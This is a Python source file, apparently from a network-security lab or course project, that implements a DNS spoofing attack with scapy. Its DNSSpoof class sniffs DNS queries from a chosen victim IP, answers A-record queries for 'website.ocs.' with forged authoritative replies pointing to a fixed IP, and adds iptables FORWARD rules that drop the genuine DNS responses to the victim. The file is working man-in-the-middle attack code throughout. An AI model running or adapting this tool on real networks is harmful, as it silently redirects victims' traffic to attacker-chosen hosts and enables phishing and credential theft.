import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

import subprocess

class DNSSpoof:
    def __init__(self, iface, victimIP, websiteIP):
        self.iface = iface
        self.victimIP = victimIP
        self.websiteIP = websiteIP

        # TODO Change this. Currently redirects to ismycomputeronfire.com
        self.fakeIP = "172.67.156.168"

        self.enable_dns_block()

    # Sniff only DNS 
    def start(self, stop_event):
        while not stop_event.is_set():
            scapy.sniff(
                iface=self.iface,
                filter="udp port 53",
                prn=self.handle_dns,
                store=False,
                timeout=1
            )
    
    def handle_dns(self, pkt):
        # Must be DNS over IP
        if not pkt.haslayer(DNS) or not pkt.haslayer(IP):
            return

        # Get DNS and IP layer
        dns = pkt[DNS]
        ip = pkt[IP]

        # We only care about DNS queries
        if dns.qr != 0:
            return
        
        # Only respond to A records
        if dns[DNSQR].qtype != 1:
            return

        # Ensure the query comes from the victim
        if ip.src != self.victimIP:
            return

        # Extract the queried domain name
        qname = dns[DNSQR].qname.decode()

        # Only spoof the domain we care about
        # TODO Do we need this?
        if qname != "website.ocs.":
            return

        print(f"[DNS] Victim asked for {qname}")
        print(f"[DNS] Spoofing {qname} -> {self.fakeIP}")

        # Build spoofed response
        spoofed_pkt = (
            IP(dst=ip.src, src=ip.dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(
                id=dns.id,  # same transaction ID
                qr=1,   # this is a response
                aa=1,   # authoritative answer         
                qd=dns.qd,  # original question
                ancount=1,
                an=DNSRR(
                    rrname=qname,   # domain name being answered
                    ttl=300,
                    rdata=self.fakeIP   # spoofed destination
                )
            )
        )

        scapy.send(spoofed_pkt, iface=self.iface, verbose=False)

    # Blocks real DNS responses 
    def enable_dns_block(self):
        rules = [
            ["iptables", "-A", "FORWARD", "-p", "udp", "--sport", "53", "-d", self.victimIP, "-j", "DROP"],
            ["iptables", "-A", "FORWARD", "-p", "tcp", "--sport", "53", "-d", self.victimIP, "-j", "DROP"],
        ]

        for rule in rules:
            subprocess.run(rule, check=True)

        print(f"> DNS responses blocked for victim {self.victimIP}")


    # Removes the rules from above
    def disable_dns_block(self):
        rules = [
            ["iptables", "-D", "FORWARD", "-p", "udp", "--sport", "53", "-d", self.victimIP, "-j", "DROP"],
            ["iptables", "-D", "FORWARD", "-p", "tcp", "--sport", "53", "-d", self.victimIP, "-j", "DROP"],
        ]

        for rule in rules:
            subprocess.run(rule, check=True)

        print(f"> DNS response blocking removed for victim {self.victimIP}")